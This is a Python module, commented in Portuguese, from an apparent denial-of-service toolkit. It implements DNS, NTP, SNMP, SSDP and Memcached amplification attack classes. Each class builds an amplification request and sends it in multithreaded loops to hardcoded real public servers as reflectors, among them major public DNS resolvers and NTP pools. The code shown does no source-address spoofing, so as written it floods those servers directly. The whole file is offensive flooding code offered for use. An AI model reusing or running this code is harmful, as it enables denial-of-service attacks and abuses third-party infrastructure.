"""
Ataques de Amplificação (DNS, NTP, SNMP, etc.)
"""
import socket
import random
import threading
import time
import struct
from .base import BaseAttack
from ..core.config import AttackConfig

class DNSAmplification(BaseAttack):
    """DNS Amplification Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando DNS Amplification...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            reflector_list = self._get_dns_reflectors()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                for reflector in reflector_list:
                    if self.stop_event.is_set():
                        break
                        
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                            sock.settimeout(2)
                            dns_payload = self._generate_dns_payload()
                            sock.sendto(dns_payload, (reflector, 53))
                            packets_sent += 1
                            self._update_stats(len(dns_payload))
                            
                    except Exception:
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes DNS")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _generate_dns_payload(self) -> bytes:
        """Gera payload DNS para amplificação"""
        # Header: ID=1, Recursion Desired, Query
        header = struct.pack('!HHHHHH', 1, 0x0100, 1, 0, 0, 0)
        
        # Query: ANY para google.com (retorna grande resposta)
        query = b'\x06google\x03com\x00\x00\xff\x00\x01'
        
        return header + query
    
    def _get_dns_reflectors(self) -> list:
        """Retorna lista de servidores DNS refletores"""
        return [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1', '9.9.9.9',
            '149.112.112.112', '208.67.222.222', '208.67.220.220',
            '64.6.64.6', '64.6.65.6', '84.200.69.80', '84.200.70.40'
        ]

class NTPAmplification(BaseAttack):
    """NTP Amplification Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando NTP Amplification...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            reflector_list = self._get_ntp_reflectors()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                for reflector in reflector_list:
                    if self.stop_event.is_set():
                        break
                        
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                            sock.settimeout(2)
                            ntp_payload = self._generate_ntp_payload()
                            sock.sendto(ntp_payload, (reflector, 123))
                            packets_sent += 1
                            self._update_stats(len(ntp_payload))
                            
                    except Exception:
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes NTP")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _generate_ntp_payload(self) -> bytes:
        """Gera payload NTP MON_GETLIST (amplificação)"""
        # NTP version 2, mode 3 (client), request MON_GETLIST
        return b'\x17\x00\x03\x2a' + b'\x00' * 4
    
    def _get_ntp_reflectors(self) -> list:
        """Retorna lista de servidores NTP refletores"""
        return [
            'pool.ntp.org', '0.pool.ntp.org', '1.pool.ntp.org',
            '2.pool.ntp.org', '3.pool.ntp.org', 'time.google.com'
        ]

class SNMPAmplification(BaseAttack):
    """SNMP Amplification Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando SNMP Amplification...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            reflector_list = self._get_snmp_reflectors()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                for reflector in reflector_list:
                    if self.stop_event.is_set():
                        break
                        
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                            sock.settimeout(2)
                            snmp_payload = self._generate_snmp_payload()
                            sock.sendto(snmp_payload, (reflector, 161))
                            packets_sent += 1
                            self._update_stats(len(snmp_payload))
                            
                    except Exception:
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes SNMP")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _generate_snmp_payload(self) -> bytes:
        """Gera payload SNMP GETBULK para amplificação"""
        # SNMPv2c GETBULK request com community public
        return bytes.fromhex(
            '3026'  # Sequence length 38
            '0201 01'  # SNMP version 2c (1)
            '0406 7075 626c 6963'  # community "public"
            'a519'  # GetBulk PDU
            '0204 022d 6f49'  # request ID
            '0201 00'  # non-repeaters
            '0201 00'  # max-repetitions
            '300b 3009 0605 2b06 0102 0115 00'  # OID .1.3.6.1.2.1.25.1.0
        )
    
    def _get_snmp_reflectors(self) -> list:
        """Retorna lista de servidores SNMP refletores"""
        return [
            '216.218.192.170', '216.218.192.172', '200.160.0.8',
            '200.160.2.8', '193.0.0.193', '193.0.0.196'
        ]

class SSDPAmplification(BaseAttack):
    """SSDP Amplification Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando SSDP Amplification...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                        sock.settimeout(2)
                        # SSDP usa multicast
                        ssdp_payload = self._generate_ssdp_payload()
                        sock.sendto(ssdp_payload, ('239.255.255.250', 1900))
                        packets_sent += 1
                        self._update_stats(len(ssdp_payload))
                        
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes SSDP")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _generate_ssdp_payload(self) -> bytes:
        """Gera payload SSDP M-SEARCH"""
        return (
            b'M-SEARCH * HTTP/1.1\r\n'
            b'HOST: 239.255.255.250:1900\r\n'
            b'MAN: "ssdp:discover"\r\n'
            b'MX: 1\r\n'
            b'ST: ssdp:all\r\n'
            b'USER-AGENT: UPnP/1.0\r\n'
            b'\r\n'
        )

class MemcachedAmplification(BaseAttack):
    """Memcached Amplification Attack"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando Memcached Amplification...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            reflector_list = self._get_memcached_reflectors()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                for reflector in reflector_list:
                    if self.stop_event.is_set():
                        break
                        
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                            sock.settimeout(2)
                            memcached_payload = self._generate_memcached_payload()
                            sock.sendto(memcached_payload, (reflector, 11211))
                            packets_sent += 1
                            self._update_stats(len(memcached_payload))
                            
                    except Exception:
                        self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes Memcached")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _generate_memcached_payload(self) -> bytes:
        """Gera payload Memcached para amplificação"""
        # Comando 'stats' retorna grande quantidade de dados
        return b'stats\r\n'
    
    def _get_memcached_reflectors(self) -> list:
        """Retorna lista de servidores Memcached refletores"""
        return [
            '54.175.19.100', '34.195.120.200'  # Exemplos - normalmente descobertos via scan
        ]